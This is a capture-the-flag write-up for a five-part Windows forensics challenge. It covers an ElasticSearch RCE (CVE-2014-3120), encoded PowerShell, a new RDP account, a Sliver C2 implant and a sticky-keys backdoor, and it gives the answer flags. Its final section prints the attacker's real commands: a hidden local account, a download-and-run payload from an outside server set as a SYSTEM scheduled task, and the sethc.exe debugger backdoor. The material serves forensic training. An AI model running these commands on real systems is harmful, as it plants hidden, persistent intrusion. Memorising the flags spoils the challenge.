# Wimdows 1
Description:
```markdown
Earlier this week, an attacker managed to get into one of our Windows servers... can you help us figure out what happened? The VM files for this challenge are located below (the credentials are `vagrant`/`vagrant`):

* https://byu.box.com/v/byuctf-wimdows

What CVE did the attacker exploit to get a shell on the machine? Wrap your answer in `byuctf{}`. E.g. `byuctf{CVE-2021-38759}`

Hint: Figure out what process the attacker exploited and look up vulnerabilities associated with it.
```

**Author**: `deltabluejay`

## Writeup
They exploited ElasticSearch using CVE-2014-3120. In Windows Event Log, there are a variety of suspicious Sysmon logs spawned as `SYSTEM` with a parent process of `elasticsearch-service-x64.exe` process. Looking up this version of ElasticSearch (1.1.1) reveals a few CVEs, but only one is an RCE vulnerability, making it the only correct choice.

**Flag** - `byuctf{CVE-2014-3120}`

# Wimdows 2
Description:
```markdown
This challenge uses the same files as for Wimdows 1.

Once they got in, the attacker ran some commands on the machine, but it looks like they tried to hide what they were doing. See if you can find anything interesting there (your answer will be found already in `byuctf{}` format).
```

**Author**: `deltabluejay`

## Writeup
Check Windows Event Log. There are PowerShell logs with base64-encoded commands. There's a flag hidden in one of them.

**Flag** - `byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}`

# Wimdows 3
Description:
```markdown
This challenge uses the same files as for Wimdows 1.

The attacker also created a new account- what group did they add this account to? Wrap your answer in `byuctf{}`. E.g. `byuctf{CTF Players}`.

*Reminder - all answers are case-insensitive for all of these problems*
```

**Author**: `deltabluejay`

## Writeup
In the Event Log, there is an event showing them adding the `phasma` account to the RDP Users group.

**Flag** - `byuctf{Remote Desktop Users}`

# Wimdows 4
Description:
```markdown
This challenge uses the same files as for Wimdows 1.

Using their access, the attacker also deployed a C2 binary on the machine - what C2 framework was it, and what IP address was the C2 attempting to connect to? Format your answer like so: `byuctf{<c2 framework>_<ip address>}`. E.g. `byuctf{evilosx_10.1.1.1}`
```

**Author**: `deltabluejay`

## Writeup
There are multiple ways to do this. One method is to upload the malicious binary (`C:\Windows\System32\update.exe`) to VirusTotal to determine what C2 it is, then run it and use netstat to find what it's trying to connect to.

**Flag** - `byuctf{sliver_192.168.1.224}`

# Wimdows 5
```markdown
This challenge uses the same files as for Wimdows 1.

Last but not least, the attacker put another backdoor in the machine to give themself SYSTEM privileges... what was it? (your answer will be found directly in `byuctf{}` format)
```

**Author**: `deltabluejay`

## Writeup
The backdoor is in the sticky keys feature. In Sysmon logs, there's a registry modification event where you can see that the sticky keys registry key is modified to spawn `cmd.exe` with a comment at the end containing the flag.

**Flag** - `byuctf{00p5_4ll_b4ckd00r5_139874}`

# How this challenge was made
From the attack box, I got a shell with the CVE using a custom Python script. Then, I ran:
```powershell
# Part 2
whoami /priv
ls -l
write-output 'byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}'
get-process
get-service

# Part 3
net user phasma f1rst0rd3r! /add
New-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force | Out-Null
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "phasma" -Value 0 -PropertyType DWord -Force
net localgroup "Remote Desktop Users" phasma /add

# Part 4
$BINARY='C:\Windows\System32\update.exe'
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://${server_ip}:8000/update.exe" -OutFile $BINARY
schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart /rl highest
schtasks /run /tn "updates"

# Part 5 (in sliver session)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe #byuctf{00p5_4ll_b4ckd00r5_139874}" /f
```